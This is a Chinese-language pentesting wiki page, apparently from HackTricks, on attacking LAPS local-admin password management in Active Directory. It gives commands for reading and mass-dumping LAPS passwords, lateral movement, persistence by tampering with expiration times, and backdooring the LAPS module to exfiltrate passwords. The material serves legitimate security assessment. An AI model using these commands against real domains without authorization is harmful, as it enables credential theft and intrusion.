# LAPS

{{#include ../../banners/hacktricks-training.md}}


## 基本信息

在 assessment 期间，目前有 **2 种 LAPS flavour**：

- **Legacy Microsoft LAPS**：将本地管理员密码存储在 **`ms-Mcs-AdmPwd`** 中，将过期时间存储在 **`ms-Mcs-AdmPwdExpirationTime`** 中。
- **Windows LAPS**（自 2023 年 4 月更新起内置于 Windows）：仍可模拟 legacy mode，但在 native mode 中使用 **`msLAPS-*`** 属性，支持**密码加密**、**密码历史记录**以及域控制器的 **DSRM 密码备份**。

LAPS 用于管理**本地管理员密码**，使其在加入域的计算机上保持**唯一、随机并频繁更换**。如果你可以读取这些属性，通常就可以将权限**pivot 为受影响主机上的本地管理员**。在许多环境中，真正有价值的不仅是读取密码本身，还包括找出**哪些用户被委派了访问密码属性的权限**。

### Legacy Microsoft LAPS 属性

在域的计算机对象中，Legacy Microsoft LAPS 的实现会新增两个属性：<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**：**明文管理员密码**
- **`ms-Mcs-AdmPwdExpirationTime`**：**密码过期时间**

### Windows LAPS 属性

Native Windows LAPS 会向计算机对象添加多个新属性：<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**：未启用加密时，以 JSON 形式存储的明文密码 blob
- **`msLAPS-PasswordExpirationTime`**：计划的过期时间
- **`msLAPS-EncryptedPassword`**：加密后的当前密码
- **`msLAPS-EncryptedPasswordHistory`**：加密后的密码历史记录
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**：域控制器的加密 DSRM 密码数据
- **`msLAPS-CurrentPasswordVersion`**：基于 GUID 的版本跟踪，用于更新的回滚检测逻辑（Windows Server 2025 forest schema）

当 **`msLAPS-Password`** 可读取时，其值是一个 JSON 对象，包含账户名称、更新时间和明文密码，例如：<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### 检查是否已激活
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

你可以从 `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` **下载原始 LAPS policy**，然后使用 [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package 中的 **`Parse-PolFile`**，将此文件转换为人类可读的格式。

### Legacy Microsoft LAPS PowerShell cmdlets

如果已安装 Legacy LAPS module，通常可以使用以下 cmdlets：
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

原生 Windows LAPS 附带了一个新的 PowerShell 模块和新的 cmdlet：
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
这里有一些需要注意的操作细节：<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** 会自动处理 **legacy LAPS**、**clear-text Windows LAPS** 和 **encrypted Windows LAPS**。
- 如果密码已加密，而你可以**读取**但无法**解密**，即使命令无法返回明文密码，该 cmdlet 仍会返回 **`Source`**、**`DecryptionStatus`** 和 **`AuthorizedDecryptor`** 等元数据。
- 在 **encrypted Windows LAPS** 中，**read permission** 和 **decrypt permission** 是**不同的控制项**。拥有 OU / object read access 并不自动意味着你可以解密 **`msLAPS-EncryptedPassword`**。
- 只有启用 **Windows LAPS encryption** 时，才可获取**密码历史记录**。
- 在域控制器上，返回的 source 可能是 **`EncryptedDSRMPassword`**。

这在 assessment 期间非常有用，因为 **`AuthorizedDecryptor`** 字段会告诉你该 blob 是为**哪个用户或组**加密的，通常可以将一次失败的密码读取转变为新的 privilege-escalation 目标。

### PowerView / LDAP

**PowerView** 也可用于查明**谁有权限读取密码，并读取该密码**：
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
如果 **`msLAPS-Password`** 可读，请解析返回的 JSON，并提取 **`p`** 作为密码，提取 **`n`** 作为受管理的本地管理员账户名称。
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
这个 **`n`** 字段在较新的部署中很重要，因为 **Windows LAPS automatic account management** 可以将目标设为 **自定义账户**，而不是内置的 **`Administrator`**；较新的 **Windows 11 24H2 / Windows Server 2025** 系统甚至可以**随机化**该账户名称。<sup>[[4]](#references)</sup>

### Linux / remote tooling

现代 tooling 同时支持 legacy Microsoft LAPS 和 Windows LAPS。
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
注释：

- 最近的 **NetExec** 构建支持 **`ms-Mcs-AdmPwd`**、**`msLAPS-Password`** 和 **`msLAPS-EncryptedPassword`**。
- **`pyLAPS`** 仍适用于从 Linux 使用 **legacy Microsoft LAPS**，但它只针对 **`ms-Mcs-AdmPwd`**。
- 较新的跨平台工具（例如 **`LAPS4LINUX`**、基于 **`dpapi-ng`** 的工具以及最近的 **NetExec** 工作流）也可以从非 Windows 主机处理 **native Windows LAPS**。
- 如果环境使用 **encrypted Windows LAPS**，仅进行简单的 LDAP 读取是不够的；你还必须是 **authorized decryptor**（或拥有等效的解密材料，例如离线域 DPAPI-NG 根密钥材料）。<sup>[[5]](#references)</sup>
- 在 **Windows 11 24H2 / Windows Server 2025** 上，不要假设受管理的本地管理员始终是 **`Administrator`**。自动账户管理可以创建自定义账户，并且可以选择随机化其名称，因此在大规模使用 **`--laps`** 之前，应先通过 **`n`** / **`Account`** 发现账户名称。<sup>[[4]](#references)</sup>

### 目录同步滥用

如果你拥有域级 **directory synchronization** 权限，而不是对每个计算机对象的直接读取权限，LAPS 仍然值得关注。

**`DS-Replication-Get-Changes`** 与 **`DS-Replication-Get-Changes-In-Filtered-Set`** 或 **`DS-Replication-Get-Changes-All`** 的组合可用于同步 **confidential / RODC-filtered** 属性，例如 legacy **`ms-Mcs-AdmPwd`**。BloodHound 将其建模为 **`SyncLAPSPassword`**。有关复制权限的背景信息，请查看 [DCSync](dcsync.md)。

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) 通过多个功能帮助枚举 LAPS。<sup>[[6]](#references)</sup>\
其中一项功能是解析 **`ExtendedRights`**，查找**所有启用了 LAPS 的计算机。**这会显示被专门委派了**读取 LAPS 密码权限的组**，这些组通常包含受保护组中的用户。\
将**计算机加入**域的**账户**会获得该主机上的 `All Extended Rights`，此权限使该**账户**能够**读取密码**。枚举结果可能会显示某个能够读取主机上 LAPS 密码的用户账户。这有助于我们**定位特定的 AD 用户**，因为他们能够读取 LAPS 密码。
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## 使用 NetExec / CrackMapExec Dump LAPS Passwords

如果你没有交互式 PowerShell，可以通过 LDAP 远程滥用此权限：
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
这会 dump 用户能够读取的所有 LAPS secrets，使你可以使用不同的本地管理员密码进行横向移动。

## 使用 LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS 持久化

### 过期日期

成为 **admin** 后，可以**获取密码**，并通过**将过期日期设置为未来时间**来**阻止**机器**更新**其**密码**。

Legacy Microsoft LAPS：
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS 改用 **`msLAPS-PasswordExpirationTime`**：
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> 如果 **admin** 使用 **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**，或者启用了 **Do not allow password expiration time longer than required by policy**，password 仍会轮换。

### 较新 Windows LAPS 中的 Snapshot 回滚注意事项

针对近期 **Windows LAPS** 部署，旧的 snapshot / image rollback 技巧的**可靠性较低**。在 **Windows 11 24H2 / Windows Server 2025** 上，如果 forest schema 包含 **`msLAPS-CurrentPasswordVersion`**（**Windows Server 2025 forest schema**），client 会将本地缓存的 GUID 与 AD 中存储的值进行比较，并在 rollback 创建出 **torn state** 时**立即轮换 password**。

实际上，这意味着基于 snapshot 的 persistence，或试图恢复较早的已知 local admin password，可能会很快失效，而不是一直存活到下一次正常 expiration。<sup>[[2]](#references)</sup>

此保护仅适用于 **AD-backed Windows LAPS**，并且仍取决于被回滚的机器能否重新 **authenticate 回 AD**。如果机器无法再与 AD 通信，**password history** 或 **AD backup access** 仍可能发挥作用。

### Automatic account management tamper 注意事项

启用 **automatic account management** 后，Windows LAPS 将负责受管理 local admin account 的生命周期。尝试意外重命名、重新配置或以其他方式 tamper 该 account，可能会被拒绝，并返回 **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**；因此，依赖于静默修改受管理 LAPS account 的 persistence，在较新的 endpoint 上可靠性较低。<sup>[[4]](#references)</sup>

### 从 AD backups 中恢复历史 password

启用 **Windows LAPS encryption + password history** 后，mounted AD backups 可能成为额外的 secrets 来源。如果你能访问 mounted AD snapshot 并使用 **recovery mode**，就可以查询较早存储的 password，而无需与 live DC 通信。<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
这主要与 **AD backup theft**、**offline forensics abuse** 或 **disaster-recovery media access** 相关。

### Backdoor

legacy Microsoft LAPS 的原始源代码可以在[这里](https://github.com/GreyCorbel/admpwd)找到，因此可以在代码中植入 backdoor（例如在 `Main/AdmPwd.PS/Main.cs` 中的 `Get-AdmPwdPassword` 方法内），以某种方式**exfiltrate 新密码或将其存储在某处**。

然后，编译新的 `AdmPwd.PS.dll`，并将其上传到机器上的 `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`（并修改其 modification time）。

## References

- [1] [Introduction to Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Windows LAPS schema and rights extensions for Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Get started with Windows LAPS and Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Windows LAPS account management modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
